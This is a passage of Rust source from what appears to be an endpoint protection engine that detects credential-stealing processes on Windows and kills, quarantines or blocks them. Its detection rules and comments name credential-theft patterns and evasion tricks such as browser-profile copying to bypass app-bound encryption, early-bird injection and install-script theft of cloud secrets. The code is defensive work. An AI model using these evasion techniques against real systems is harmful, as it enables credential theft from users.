        f: impl Fn(&mut dyn Family, &Ctx, &mut Vec<FamilyHit>),
        alerts_from: usize,
    ) {
        let mut fams = std::mem::take(&mut self.families);
        let mut hits = Vec::new();
        {
            let ctx = Ctx { st: self, now };
            for fam in fams.iter_mut() {
                f(fam.as_mut(), &ctx, &mut hits);
            }
        }
        for h in hits {
            self.emit_family(ev, h);
        }
        let alerts: Vec<Alert> = self.out[alerts_from.min(self.out.len())..]
            .iter()
            .filter_map(|o| match o {
                Output::Alert(d) => Some(d.alert.clone()),
                _ => None,
            })
            .collect();
        if !alerts.is_empty() {
            let mut hits = Vec::new();
            {
                let ctx = Ctx { st: self, now };
                for a in &alerts {
                    for fam in fams.iter_mut() {
                        fam.on_alert(&ctx, a, &mut hits);
                    }
                }
            }
            for h in hits {
                self.emit_family(ev, h);
            }
        }
        // A family may have been added meanwhile only by `families::all()`.
        self.families = fams;
    }

    fn emit_family(&mut self, ev: &Event, h: FamilyHit) {
        let mut hit = Hit::new(h.rule, &h.guid, h.severity, h.summary);
        hit.actions = h.actions;
        hit.suspend = h.suspend;
        hit.kill_at_expiry = h.kill_at_expiry;
        hit.strong |= h.strong;
        hit.extra_evidence = h.extra_evidence;
        hit.dedup_key = h.dedup_key;
        hit.process = h.process;
        hit.remediation_only = h.remediation_only;
        if h.audit_only {
            hit.mode_override = Some(RuleMode::Audit);
        }
        self.emit(ev, hit);
    }

    fn proc_info(&self, e: &Event) -> ProcessInfo {
        self.table
            .get(&e.guid)
            .cloned()
            .unwrap_or_else(|| placeholder(&e.guid, e.pid, e.ts))
    }

    fn state(&mut self, g: &ProcessGuid, ts: TimestampMs) -> &mut ProcState {
        if !self.states.contains_key(g) {
            self.states.insert(g.clone(), ProcState::default());
        }
        let s = self.states.get_mut(g).expect("inserted");
        s.last_activity = s.last_activity.max(ts);
        s
    }

    fn mode(&self, rule: &str) -> RuleMode {
        if let Some(m) = self.policy.rules.get(rule) {
            return *m;
        }
        if let Some(m) = builtin_meta().get(rule) {
            return m.default_mode;
        }
        if let Some(r) = self.sigma.iter().find(|r| r.meta.id == rule) {
            return r.meta.default_mode;
        }
        RuleMode::Audit
    }

    /// Exclusions never apply to tamper rules (TP-*): an exclusion must not
    /// be able to silence self-protection.
    fn excluded(&self, p: &ProcessInfo, rule: &str, now: TimestampMs) -> bool {
        if rule.to_ascii_uppercase().starts_with("TP-") {
            return false;
        }
        self.exclusions
            .iter()
            .any(|x| x.matches(p, rule, now, self.system_drive))
    }

    /// Never kill / suspend these: PID 0/4, the agent, and critical OS
    /// processes / Microsoft security products at their exact location on the
    /// system volume with a valid Microsoft signature ([`protect`]). Name or
    /// folder alone never protects; `Unknown` signatures never do.
    fn protected(&self, p: &ProcessInfo) -> bool {
        if p.pid == 0 || p.pid == 4 || self.is_agent_guid(&p.guid) {
            return true;
        }
        protect::is_protected_process(&p.image, p.signed, p.signer.as_deref(), self.system_drive)
    }

    /// Trusted Windows binary: System/Windows dir on the system volume, a
    /// **valid Microsoft** signature, not a LOLBin.
    pub(crate) fn system_trusted(p: &ProcessInfo) -> bool {
        matches!(p.path_class, PathClass::System | PathClass::Windows)
            && protect::microsoft_signed(p.signed, p.signer.as_deref())
            && !is_lolbin(&file_name_lower(&p.image))
    }

    /// Untrusted actor for ST-07: unsigned/invalid, Temp/Downloads/external,
    /// user-writable without a valid signature, or a LOLBin / script host.
    pub(crate) fn untrusted_actor(p: &ProcessInfo) -> bool {
        if p.image.is_empty() {
            return true;
        }
        is_untrusted_location_or_signature(p)
            || (p.path_class == PathClass::UserWritable && p.signed != SignatureState::Valid)
            || (p.path_class == PathClass::Other && p.signed != SignatureState::Valid)
            || is_lolbin(&file_name_lower(&p.image))
    }

    // ---- fix round 2026-10-25: taint, identity, process trees ----

    /// Mark `g` as tampered with (injected into, written to, thread
    /// context changed, debugged, or side-loaded): it loses every allowance
    /// and owner status for its lifetime. Bounded without ever re-trusting
    /// a live process (review of the 1.1.7 integration, L1): when the set
    /// reaches its prune mark, only entries of processes that exited or
    /// left the process table are dropped. Live entries always stay, so the
    /// set never exceeds the table's own cap (plus the new entry); the next
    /// prune mark is twice what is left, so a flood of live tainted
    /// processes costs amortised O(1) per taint, not a scan each time.
    fn taint(&mut self, g: ProcessGuid) {
        if self.tampered.len() >= self.taint_prune_at && !self.tampered.contains(&g) {
            let table = &self.table;
            self.tampered
                .retain(|t| table.get(t).is_some_and(|p| p.exit_ts.is_none()));
            self.taint_prune_at = MAX_TAINTED.max(self.tampered.len().saturating_mul(2));
        }
        self.tampered.insert(g);
    }

    /// Tainted processes held (tests).
    #[cfg(test)]
    pub(crate) fn tainted_len(&self) -> usize {
        self.tampered.len()
    }

    fn tainted(&self, g: &ProcessGuid) -> bool {
        self.tampered.contains(g)
    }

    /// Where a process tree stops for ST-02 / ST-04 tree correlation: the
    /// first ancestor that is a trusted Windows binary (explorer, services,
    /// svchost), a protected process, or a genuine installed application
    /// (Program Files / Windows, or a listed publisher's install) that is
    /// not an interpreter / LOLBin and was never tampered with. Unknown
    /// images stop the walk too.
    fn tree_boundary(&self, p: &ProcessInfo) -> bool {
        if p.image.is_empty() || self.protected(p) {
            return true;
        }
        let tainted = self.tainted(&p.guid);
        if Self::system_trusted(p) && !tainted {
            return true;
        }
        let name = file_name_lower(&p.image);
        if crate::legit_apps::is_interpreter(&name) || is_lolbin(&name) {
            return false;
        }
        identity::genuine(p, self.system_drive, tainted)
            && (crate::legit_apps::in_program_files(&p.image, self.system_drive)
                || identity::in_windows_dir(&p.image, self.system_drive)
                || identity::publishers_for(&name).next().is_some())
    }

    /// `g` and its ancestors up to (excluding) the first tree boundary.
    fn tree_keys(&self, g: &ProcessGuid) -> Vec<ProcessGuid> {
        let mut keys = vec![g.clone()];
        let mut cur = self.table.get(g).cloned();
        for _ in 0..MAX_TREE_DEPTH {
            let Some(p) = cur else { break };
            let parent = self.table.parent_of(&p).cloned();
            match parent {
                Some(pp) => {
                    if self.tree_boundary(&pp) || keys.contains(&pp.guid) {
                        break;
                    }
                    keys.push(pp.guid.clone());
                    cur = Some(pp);
                }
                None => {
                    // The parent left the table: its GUID still names the tree.
                    if let Some(pg) = p.parent_guid.clone() {
                        if !keys.contains(&pg) && self.tree.contains_key(&pg) {
                            keys.push(pg);
                        }
                    }
                    break;
                }
            }
        }
        keys
    }

    /// Record a non-benign credential read (or DPAPI unprotect) of `reader`
    /// for its whole untrusted tree; returns the tree root key.
    fn record_tree_read(
        &mut self,
        reader: &ProcessInfo,
        app: &'static str,
        noun: &'static str,
        category: DataCategory,
        ts: TimestampMs,
    ) -> Option<ProcessGuid> {
        let keys = self.tree_keys(&reader.guid);
        let high_value = !matches!(category, DataCategory::CloudToken | DataCategory::SshKeys);
        if self.tree.len() >= MAX_TREE {
            let mut v: Vec<TimestampMs> = self.tree.values().map(|c| c.last_ts).collect();
            v.sort_unstable();
            let cut = v[v.len() / 8];
            self.tree.retain(|_, c| c.last_ts > cut);
        }
        for k in &keys {
            let c = self.tree.entry(k.clone()).or_insert_with(|| TreeCred {
                reader: reader.guid.clone(),
                reader_info: None,
                last_ts: ts,
                first_ts: ts,
                cat_ts: [None; NUM_CATEGORIES],
                members: vec![],
                apps: vec![],
                high_value: false,
                touched: vec![],
            });
            c.reader = reader.guid.clone();
            c.reader_info = Some(reader.clone());
            c.last_ts = c.last_ts.max(ts);
            c.first_ts = c.first_ts.min(ts);
            c.cat_ts[cat_index(category)] = Some(ts);
            if !c.members.contains(&reader.guid) && c.members.len() < 16 {
                c.members.push(reader.guid.clone());
            }
            if !c.apps.contains(&app) && c.apps.len() < 32 {
                c.apps.push(app);
            }
            if c.touched.len() < MAX_TOUCHED && !c.touched.contains(&(app, noun)) {
                c.touched.push((app, noun));
            }
            c.high_value |= high_value;
        }
        keys.last().cloned()
    }

    /// ST-02 across a process tree (corpus `evasion_copy_stores_via_children`):
    /// three kinds of secrets within 60 s collected by at least two
    /// processes of one untrusted tree. Subject: the tree root (killed with
    /// its tree in Protect).
    fn check_tree_st02(&mut self, e: &Event, root: &ProcessGuid) {
        let Some(c) = self.tree.get(root) else { return };
        let ncat = c.categories_within(e.ts, ST02_WINDOW_MS);
        if ncat < ST02_MIN_CATEGORIES || c.members.len() < 2 {
            return;
        }
        let phrase = stores_phrase(&c.touched);
        let first = c.first_ts;
        let members = c.members.len();
        let rp = self
            .table
            .get(root)
            .cloned()
            .unwrap_or_else(|| placeholder(root, 0, e.ts));
        let mut hit = Hit::new(
            ST02,
            root,
            Severity::Critical,
            format!(
                "The process tree of {} ({members} processes) collected {phrase} — {ncat} kinds of secrets within {}",
                describe(&rp),
                fmt_secs(e.ts - first)
            ),
        );
        hit.dedup_key = Some(format!("{ST02}#tree"));
        hit.actions.push(kill(&rp, true));
        if rp.path_class.is_user_writable() && !rp.image.is_empty() {
            hit.actions.push(ResponseAction::BlockImageNetwork {
                image: rp.image.clone(),
                ttl_secs: None,
            });
            hit.actions.push(quarantine(&rp));
        }
        hit.strong = true;
        hit.process = Some(rp);
        if e.guid != *root {
            hit.extra_evidence.push(e.clone());
        }
        self.emit(e, hit);
    }

    /// Credential stores that trusted Windows binaries legitimately read
    /// (the vault / Credential Manager / DPAPI services, the token broker).
    /// Browser, wallet, messenger, developer and every other store read by a
    /// Windows binary is judged like any other reader (corpus finding 1:
    /// credwiz / OpenWith / explorer hosting a stealer).
    fn system_reader_ok(&self, p: &ProcessInfo, store: &SensitiveStore) -> bool {
        Self::system_trusted(p)
            && !self.tainted(&p.guid)
            && matches!(
                store.app,
                "Windows Credential Manager"
                    | "Windows DPAPI"
                    | "Windows token broker"
                    | "Microsoft identity (MSAL)"
            )
    }

    /// Sensor 2026-10-25: is `norm` (a `...\local state` path) the reading
    /// process's **own** profile key: the last `--user-data-dir` of the
    /// process or of a same-image parent / child, or
    /// `%APPDATA%\<name>\Local State` / `%LOCALAPPDATA%\<name>\Local State`
    /// where `<name>` is the app's own folder (image file name or install
    /// folder). Named browser profiles and Discord's key are never "own"
    /// for anything but their owners (handled by the owner checks).
    fn own_profile_local_state(&self, p: &ProcessInfo, norm: &str) -> bool {
        let Some(dir) = norm.strip_suffix(r"\local state") else {
            return false;
        };
        if dir.contains('~') || p.image.is_empty() {
            return false;
        }
        if let Some(s) = match_normalized(norm) {
            if s.app != "Chromium-based browser" {
                return false;
            }
        }
        let same_image = |q: &ProcessInfo| {
            crate::table::image_key(&q.image) == crate::table::image_key(&p.image)
        };
        let mut procs: Vec<&ProcessInfo> = vec![p];
        if let Some(pp) = self.table.parent_of(p).filter(|q| same_image(q)) {
            procs.push(pp);
        }
        procs.extend(
            self.table
                .children_of(&p.guid)
                .into_iter()
                .filter(|q| same_image(q)),
        );
        for q in procs {
            let sw = crate::legit_apps::switches(&q.cmdline);
            if let Some(udd) = sw
                .iter()
                .rev()
                .find(|(k, _)| k == "user-data-dir")
                .and_then(|(_, v)| v.as_deref())
            {
                if normalize_path(udd.trim().trim_end_matches('\\')) == dir {
                    return true;
                }
            }
        }
        let Some(rel) = crate::paths::profile_relative(dir) else {
            return false;
        };
        let Some(name) = rel
            .strip_prefix(r"appdata\roaming\")
            .or_else(|| rel.strip_prefix(r"appdata\local\"))
        else {
            return false;
        };
        if name.len() < 3
            || name.contains('\\')
            || matches!(
                name,
                "microsoft" | "google" | "mozilla" | "programs" | "packages" | "temp" | "local"
            )
        {
            return false;
        }
        let img = normalize_path(&p.image);
        let stem = crate::paths::file_name(&img);
        stem.starts_with(name) || img.contains(&format!(r"\{name}\"))
    }

    /// A package-manager install anywhere above `p` (npm / pnpm / yarn /
    /// bun / pip / poetry lifecycle scripts): install-time code has no
    /// business using cloud credentials (Shai-Hulud, corpus
    /// `script_shai_hulud_aws_secrets_manager`).
    fn package_install_tree(&self, p: &ProcessInfo) -> bool {
        let mut chain = vec![p.clone()];
        chain.extend(self.table.ancestry(&p.guid, 5));
        chain.iter().any(|q| {
            let c = q.cmdline.to_ascii_lowercase();
            let words: Vec<&str> = c
                .split(|ch: char| ch.is_whitespace() || ch == '"')
                .filter(|w| !w.is_empty())
                .collect();
            let has = |w: &str| words.contains(&w);
            let npm = words.iter().any(|w| {
                w.ends_with("npm-cli.js")
                    || w.ends_with("npm.cmd")
                    || *w == "npm"
                    || w.ends_with("pnpm.cjs")
                    || w.ends_with("pnpm.cmd")
                    || *w == "pnpm"
                    || w.ends_with("yarn.js")
                    || w.ends_with("yarn.cjs")
                    || *w == "yarn"
                    || *w == "bun"
                    || w.ends_with("bun.exe")
            }) && (has("install") || has("i") || has("ci") || has("add"));
            let pip = words.iter().any(|w| {
                *w == "pip"
                    || *w == "pip3"
                    || w.ends_with("pip.exe")
                    || w.ends_with("pip3.exe")
                    || *w == "poetry"
                    || w.ends_with("poetry.exe")
            }) && has("install");
            let pym = has("-m") && has("pip") && has("install");
            npm || pip || pym
        })
    }

    /// FP-08 (fix round 2026-10-25): Playwright / Puppeteer launching a
    /// browser with remote debugging. Benign only when **all** hold:
    /// no `--load-extension`; the profile is not a real browser profile
    /// (its last `--user-data-dir` is a fresh `playwright_*` /
    /// `puppeteer_dev_*` folder directly in the profile's Temp folder, or the
    /// browser is the framework's own build under `ms-playwright` /
    /// `.cache\puppeteer` with no `--user-data-dir` or such a temporary one);
    /// and the launching tree read no browser store in the last 10 minutes
    /// (copying the real profile into a "playwright_" folder first is the
    /// ABE bypass, which keeps the full response).
    fn browser_automation(
        &self,
        info: &ProcessInfo,
        parent: Option<&ProcessInfo>,
        load_ext: bool,
    ) -> bool {
        if load_ext {
            return false;
        }
        let sw = crate::legit_apps::switches(&info.cmdline);
        let udd = sw
            .iter()
            .rev()
            .find(|(k, _)| k == "user-data-dir")
            .map(|(_, v)| v.clone().unwrap_or_default());
        let temp_profile = |u: &str| {
            let n = normalize_path(u.trim().trim_matches('"').trim_end_matches('\\'));
            if n.contains('~') {
                return false;
            }
            crate::paths::profile_relative(&n).is_some_and(|r| {
                r.strip_prefix(r"appdata\local\temp\").is_some_and(|leaf| {
                    !leaf.contains('\\')
                        && (leaf.starts_with("playwright_")
                            || leaf.starts_with("playwright-")
                            || leaf.starts_with("puppeteer_dev_"))
                })
            })
        };
        let img = normalize_path(&info.image);
        let framework_browser =
            img.contains(r"\ms-playwright\") || img.contains(r"\.cache\puppeteer\");
        let profile_ok = match udd.as_deref() {
            Some(u) if !u.trim().is_empty() => temp_profile(u),
            _ => framework_browser,
        };
        if !profile_ok {
            return false;
        }
        let recent = |t: TimestampMs| t <= info.start_ts && info.start_ts - t <= 10 * 60 * 1000;
        let tree_read = parent.is_some_and(|p| {
            self.tree_keys(&p.guid).iter().any(|k| {
                self.tree.get(k).is_some_and(|c| {
                    recent(c.last_ts) && c.cat_ts[..4].iter().any(|t| t.is_some_and(recent))
                })
            }) || self
                .states
                .get(&p.guid)
                .is_some_and(|s| s.non_wam_cred && s.cred_ts().is_some_and(recent))
        });
        !tree_read
    }

    /// Red-team round 2 (early-bird injection into a browser the stealer
    /// launched itself: no handle or thread event reaches a user-mode
    /// sensor): was `p` started by a process that is not a trusted launcher
    /// (a trusted Windows binary, a protected process, a genuine browser, or
    /// a genuine application pinned by the publisher table or installed in
    /// an admin-only folder)? Unknown parents are not held against it.
    fn launched_by_untrusted(&self, p: &ProcessInfo) -> bool {
        let Some(pp) = self.table.parent_of(p) else {
            return false;
        };
        if pp.image.is_empty() {
            return false;
        }
        let t = self.tainted(&pp.guid);
        let sd = self.system_drive;
        let trusted = (Self::system_trusted(pp) && !t)
            || self.protected(pp)
            || identity::genuine_browser(pp, sd, t)
            || (identity::genuine(pp, sd, t)
                && (identity::listed(&pp.image) || identity::admin_location(&pp.image, sd)));
        !trusted
    }

    /// Review of the 1.1.7 integration (M3): may this genuine Electron
    /// application be running someone else's code? `ELECTRON_RUN_AS_NODE`
    /// is invisible to the sensor, so an Electron owner keeps owner status
    /// only when its command line is a plain launch (checked in
    /// [`crate::paths::is_trusted_owner`]) **and** it was started by a
    /// trusted launcher ([`Self::launched_by_untrusted`]: Explorer, the
    /// service host, the app's own genuine updater such as Squirrel's
    /// `Update.exe`, a genuine browser for a protocol link) or by a plain
    /// instance of itself (Chromium child processes), walked up to a few
    /// levels. Unknown parents are not held against it.
    fn electron_hijack_suspected(&self, p: &ProcessInfo) -> bool {
        let name = file_name_lower(&p.image);
        if crate::legit_apps::electron_runs_foreign_code(&name, &p.cmdline) {
            return true;
        }
        // The launcher check is for the store-owning apps only: developer
        // hosts are started from terminals, IDE tasks and scripts all day.
        if !crate::legit_apps::is_electron_owner_image(&name) {
            return false;
        }
        let sd = self.system_drive;
        let mut cur = p.clone();
        for _ in 0..8 {
            let Some(pp) = self.table.parent_of(&cur) else {
                return false;
            };
            if pp.image.is_empty() {
                return false;
            }
            let same_app = file_name_lower(&pp.image) == name
                && identity::genuine(pp, sd, self.tainted(&pp.guid));
            if !same_app {
                return self.launched_by_untrusted(&cur);
            }
            if crate::legit_apps::electron_runs_foreign_code(&name, &pp.cmdline) {
                return true;
            }
            cur = pp.clone();
        }
        true
    }

    /// Does the browser store at `norm` (a profile path below
    /// `...\<vendor>\<product>\User Data\` or `...\Profiles\`) belong to the
    /// vendor of the browser `image` (every folder of the store's vendor path
    /// appears in the image path)?
    fn same_vendor_store(image: &str, norm: &str) -> bool {
        let root = norm
            .find(r"\user data\")
            .or_else(|| norm.find(r"\profiles\"))
            .map(|i| &norm[..i + 1]);
        let Some(rel) = root.and_then(crate::paths::profile_relative) else {
            return false;
        };
        let vendor = rel
            .strip_prefix(r"appdata\local\")
            .or_else(|| rel.strip_prefix(r"appdata\roaming\"))
            .unwrap_or("");
        let comps: Vec<&str> = vendor.split('\\').filter(|c| !c.is_empty()).collect();
        let img = normalize_path(image);
        !comps.is_empty() && comps.iter().all(|c| img.contains(c))
    }

    /// The BITS service host: Microsoft-signed System32 `svchost.exe` whose
    /// command line names the BITS service (`-s BITS`), or the shared
    /// `netsvcs` group without `-s` (service grouping off).
    fn bits_host(p: &ProcessInfo) -> bool {
        if !Self::system_trusted(p) || file_name_lower(&p.image) != "svchost.exe" {
            return false;
        }
        let c = p.cmdline.to_ascii_lowercase();
        let words: Vec<&str> = c.split_whitespace().collect();
        let s_value = words.windows(2).find(|w| w[0] == "-s").map(|w| w[1]);
        match s_value {
            Some(v) => v == "bits",
            None => words.windows(2).any(|w| w[0] == "-k" && w[1] == "netsvcs"),
        }
    }

    /// The Windows Installer service instance (ST-07 Restart Manager
    /// exemption): System32 `msiexec.exe` with a valid Microsoft signature,
    /// command line exactly `msiexec.exe /V`, running as SYSTEM, parent the
    /// System32 `services.exe`. Never the client instance, `/y` / `/z`
    /// (DllRegisterServer of an arbitrary DLL) or custom-action servers.
    fn is_msiserver(&self, p: &ProcessInfo) -> bool {
        if !protect::microsoft_signed(p.signed, p.signer.as_deref())
            || protect::on_system_volume(&p.image, self.system_drive).as_deref()
                != Some(r"\windows\system32\msiexec.exe")
            || !is_system_user(p.user.as_deref())
        {
            return false;
        }
        let args: Vec<String> = p
            .cmdline
            .to_ascii_lowercase()
            .split_whitespace()
            .skip(1)
            .map(str::to_string)
            .collect();
        if args != ["/v"] {
            return false;
        }
        self.table.parent_of(p).is_some_and(|pp| {
            file_name_lower(&pp.image) == "services.exe"
                && path_class_of(&pp.image, self.system_drive) == PathClass::System
                && protect::microsoft_signed(pp.signed, pp.signer.as_deref())
        })
    }
    fn is_benign_av(p: &ProcessInfo) -> bool {
        let name = file_name_lower(&p.image);
        !is_untrusted_location_or_signature(p)
            && crate::paths::BENIGN_READERS.iter().any(|r| {
                matches!(
                    r.kind,
                    crate::paths::BenignKind::Security | crate::paths::BenignKind::Indexer
                ) && glob_match(r.image, &name)
                    && identity::signer_in(r.signers, p.signer.as_deref())
            })
    }

    fn related_windows(&self, guid: &ProcessGuid) -> Vec<usize> {
        let parent = self
            .table
            .get(guid)
            .and_then(|p| self.table.parent_of(p))
            .map(|p| p.guid.clone());
        self.suspends
            .iter()
            .enumerate()
            .filter(|(_, w)| {
                &w.guid == guid
                    || parent.as_ref() == Some(&w.guid)
                    || self
                        .table
                        .get(&w.guid)
                        .and_then(|wp| self.table.parent_of(wp))
                        .is_some_and(|wp| &wp.guid == guid)
            })
            .map(|(i, _)| i)
            .collect()
    }

    /// V-H4 / V-M5: an engine-proposed quarantine of a process image (any
    /// process in the table with that image) or of the DLL whose load
    /// triggered the hit (`ev`) must pass
    /// [`crate::families::image_quarantinable`] for every such process.
    /// Paths that are neither (dropped files, attacker-named paths) are
    /// judged by the rules that proposed them.
    fn quarantine_image_ok(&self, path: &str, ev: Option<&Event>) -> bool {
        use crate::families::image_quarantinable;
        if let Some(e) = ev {
            if let EventData::ImageLoad {
                path: dll, signed, ..
            } = &e.data
            {
                if crate::table::image_key(dll) == crate::table::image_key(path) {
                    let user = self.table.get(&e.guid).and_then(|p| p.user.as_deref());
                    return image_quarantinable(path, *signed, user);
                }
            }
        }
        self.table
            .by_image(path)
            .iter()
            .all(|p| image_quarantinable(path, p.signed, p.user.as_deref()))
    }

    fn filter_actions(
        &self,
        actions: Vec<ResponseAction>,
        ev: Option<&Event>,
    ) -> Vec<ResponseAction> {
        let mut out: Vec<ResponseAction> = Vec::new();
        for a in actions {
            let keep = match &a {
                ResponseAction::KillProcess { pid, guid, .. }
                | ResponseAction::SuspendProcess { pid, guid }
                | ResponseAction::ResumeProcess { pid, guid } => {
                    let p = guid
                        .as_ref()
                        .and_then(|g| self.table.get(g))
                        .or_else(|| self.table.by_pid(*pid));
                    match p {
                        Some(p) => !self.protected(p),
                        None => *pid != 0 && *pid != 4,
                    }
                }
                ResponseAction::QuarantineFile { path, .. } => {
                    !path.is_empty()
                        && path_class_of(path, self.system_drive).is_user_writable()
                        && !self.may_be_agent_image(path)
                        && !never_quarantine(path)
                        && self.quarantine_image_ok(path, ev)
                }
                ResponseAction::BlockDestination { ip, .. } => parse_ip(ip)
                    .is_some_and(|i| !self.server_ips.contains(&i.to_string()) && !i.is_loopback()),
                ResponseAction::BlockImageNetwork { image, .. } => {
                    // Never cut the network of shared OS binaries (svchost,
                    // explorer, …): that would take the whole host offline.
                    !image.is_empty()
                        && !self.may_be_agent_image(image)
                        && !matches!(
                            path_class_of(image, self.system_drive),
                            PathClass::System | PathClass::Windows
                        )
                }
                _ => true,
            };
            if keep && !out.contains(&a) {
                out.push(a);
            }
        }
        out
    }

    /// NEW-1: rate limit for a re-issued `RemoveAutorun` of the same object.
    /// Returns the action when it may go out now; otherwise it is held and
    /// sent by [`Self::tick`] once the interval has passed, so a re-plant
    /// inside the interval is still removed.
    fn autorun_gate(&mut self, a: ResponseAction, now: TimestampMs) -> Option<ResponseAction> {
        let fp = format!("{a:?}");
        match self.autorun_reissue.get_mut(&fp) {
            Some((last, pending)) if now >= *last && now - *last < AUTORUN_REISSUE_MS => {
                *pending = Some(a);
                None
            }
            Some((last, pending)) => {
                *last = now;
                *pending = None;
                Some(a)
            }
            None => {
                if self.autorun_reissue.len() < MAX_AUTORUN_REISSUE {
                    self.autorun_reissue.insert(fp, (now, None));
                }
                Some(a)
            }
        }
    }

    /// Record a `RemoveAutorun` ordered with an alert (starts its rate-limit interval).
    fn note_autorun_ordered(&mut self, a: &ResponseAction, now: TimestampMs) {
        let fp = format!("{a:?}");
        if let Some(e) = self.autorun_reissue.get_mut(&fp) {
            *e = (now, None);
        } else if self.autorun_reissue.len() < MAX_AUTORUN_REISSUE {
            self.autorun_reissue.insert(fp, (now, None));
        }
    }

    /// Central emission path (see module docs).
    fn emit(&mut self, ev: &Event, mut hit: Hit) {
        let mode = match hit.mode_override {
            Some(m) => {
                if self.policy.rules.get(&hit.rule) == Some(&RuleMode::Off) {
                    return;
                }
                m
            }
            None => self.mode(&hit.rule),
        };
        if mode == RuleMode::Off {
            return;
        }
        // The policy's mode, before a local pause (folding of Low alerts
        // must not depend on the pause switch).
        let policy_protect = mode == RuleMode::Protect;
        // Protection turned off locally: detect and report only.
        let mode = if self.paused.is_some() && mode == RuleMode::Protect {
            RuleMode::Audit
        } else {
            mode
        };
        let proc_ = hit
            .process
            .take()
            .or_else(|| self.table.get(&hit.guid).cloned())
            .unwrap_or_else(|| placeholder(&hit.guid, ev.pid, ev.ts));
        let agent_itself = self.is_agent_guid(&proc_.guid) || self.is_agent_identity(&proc_);
        if !hit.tamper && (proc_.pid == 0 || proc_.pid == 4 || agent_itself) {
            // Remediation-only hits (unattributed registry / task changes,
            // V-H7) carry a synthetic "unknown writer" subject: they may
            // only remove the persistence object, never touch a process.
            if !(hit.remediation_only && is_unknown_subject(&proc_)) {
                return;
            }
        }
        // V-H1: the agent's recorded direct children (hardening PowerShell,
        // kestrel-scan, msiexec) are skipped by every rule but TP-*.
        let tp_rule = hit.tamper || hit.rule.to_ascii_uppercase().starts_with("TP-");
        if !tp_rule && self.agent_children.contains(&proc_.guid) {
            return;
        }
        if hit.remediation_only {
            hit.actions
                .retain(|a| matches!(a, ResponseAction::RemoveAutorun { .. }));
            hit.suspend = false;
            hit.kill_at_expiry = false;
            hit.strong = false;
        }
        if !hit.tamper && self.iocs.allowed_process(&proc_) {
            return;
        }
        if self.excluded(&proc_, &hit.rule, ev.ts) {
            return;
        }
        let protect = mode == RuleMode::Protect;
        let related = if hit.strong && protect {
            self.related_windows(&hit.guid)
        } else {
            vec![]
        };
        let dedup_key = hit.dedup_key.clone().unwrap_or_else(|| hit.rule.clone());
        let last = self
            .states
            .get(&hit.guid)
            .and_then(|s| s.last_fired(&dedup_key));
        let mut deduped =
            last.is_some_and(|t| ev.ts >= t && ev.ts - t < DEDUP_MS) && related.is_empty();
        if deduped && protect {
            // NEW-1: the same autorun hit again after Kestrel ordered its
            // removal means it was re-planted. Alert once more (at most once
            // per 10 min per subject and key) instead of staying silent.
            let replanted = {
                let rkey = format!("{dedup_key}#replanted");
                let st = self.state(&hit.guid, ev.ts);
                let was_removed = hit.actions.iter().any(|a| {
                    matches!(a, ResponseAction::RemoveAutorun { .. })
                        && st.ordered.contains(&format!("{a:?}"))
                });
                let recent = st
                    .last_fired(&rkey)
                    .is_some_and(|t| ev.ts >= t && ev.ts - t < DEDUP_MS);
                if was_removed && !recent {
                    st.set_fired(&rkey, ev.ts);
                    true
                } else {
                    false
                }
            };
            if replanted {
                deduped = false;
                hit.summary
                    .push_str(" — the entry came back after Kestrel removed it");
            }
        }
        if deduped {
            // One alert per rule / process / 10 min — but a re-hit in Protect
            // mode that brings *new* response actions (e.g. a new exfil
            // destination after the first kill failed) still executes them.
            // A `RemoveAutorun` is idempotent (the agent re-reads the entry
            // before acting) and is re-issued whenever the entry comes back,
            // rate-limited per object (NEW-1).
            if protect && !hit.actions.is_empty() {
                let actions = self.filter_actions(std::mem::take(&mut hit.actions), Some(ev));
                let mut fresh = Vec::new();
                for a in actions {
                    if matches!(a, ResponseAction::RemoveAutorun { .. }) {
                        if let Some(a) = self.autorun_gate(a, ev.ts) {
                            fresh.push(a);
                        }
                        continue;
                    }
                    let st = self.state(&hit.guid, ev.ts);
                    if st.ordered.len() < 256 && st.ordered.insert(format!("{a:?}")) {
                        fresh.push(a);
                    }
                }
                for a in fresh {
                    if let ResponseAction::KillProcess { guid: Some(g), .. } = &a {
                        self.state(g, ev.ts).killed = true;
                        self.suspends.retain(|w| &w.guid != g);
                    }
                    self.out.push(Output::Action(a));
                }
            }
            return;
        }

        // Triage 2026-10-22 item 12: aggregation safety net. A Low / Info
        // alert in Audit mode is emitted at most once per (rule, image hash
        // or path, evidence object) per 24 h on this device; later repeats
        // are counted and reported on the next alert of the same key.
        if !policy_protect
            && hit.severity <= Severity::Low
            && !tp_rule
            && hit.rule != ST04
            && !hit.remediation_only
            && !proc_.image.is_empty()
        {
            let image_id = proc_
                .sha256
                .as_deref()
                .map(str::trim)
                .filter(|h| !h.is_empty())
                .map(|h| h.to_ascii_lowercase())
                .unwrap_or_else(|| normalize_path(&proc_.image));
            // Review L2: keys are hashed (bounded memory per entry).
            let key =
                crate::canary::fnv64(&format!("{dedup_key}|{image_id}|{}", evidence_object(ev)));
            match self.low_seen.get_mut(&key) {
                Some((t, n)) if ev.ts >= *t && ev.ts - *t < LOW_AGG_MS => {
                    *n = n.saturating_add(1);
                    return;
                }
                Some((t, n)) => {
                    if *n > 0 {
                        hit.summary.push_str(&format!(
                            " (the same alert was folded {n} more times in the previous 24 h)"
                        ));
                    }
                    *t = ev.ts;
                    *n = 0;
                }
                None => {
                    if self.low_seen.len() >= MAX_LOW_SEEN {
                        let now = ev.ts;
                        self.low_seen
                            .retain(|_, (t, _)| now >= *t && now - *t < LOW_AGG_MS);
                        if self.low_seen.len() >= MAX_LOW_SEEN {
                            // Drop the oldest eighth in one pass.
                            let mut ts: Vec<TimestampMs> =
                                self.low_seen.values().map(|(t, _)| *t).collect();
                            ts.sort_unstable();
                            let cut = ts[ts.len() / 8];
                            self.low_seen.retain(|_, (t, _)| *t > cut);
                        }
                    }
                    self.low_seen.insert(key, (ev.ts, 0));
                }
            }
        }

        let mut actions = Vec::new();
        if protect {
            actions = std::mem::take(&mut hit.actions);
            // escalate suspend windows
            let mut idx = related;
            idx.sort_unstable_by(|a, b| b.cmp(a));
            for i in idx {
                let w = self.suspends.remove(i);
                actions.push(ResponseAction::KillProcess {
                    pid: w.pid,
                    guid: Some(w.guid.clone()),
                    tree: true,
                });
                if w.quarantine {
                    actions.push(ResponseAction::QuarantineFile {
                        path: w.image.clone(),
                        sha256: w.sha256.clone(),
                    });
                }
                if let Some((ip, port, scope)) = &hit.escalation_ip {
                    actions.push(ResponseAction::BlockDestination {
                        ip: ip.clone(),
                        port: Some(*port),
                        image: scope.clone(),
                        ttl_secs: Some(BLOCK_TTL_SECS),
                        ioc_id: None,
                    });
                }
            }
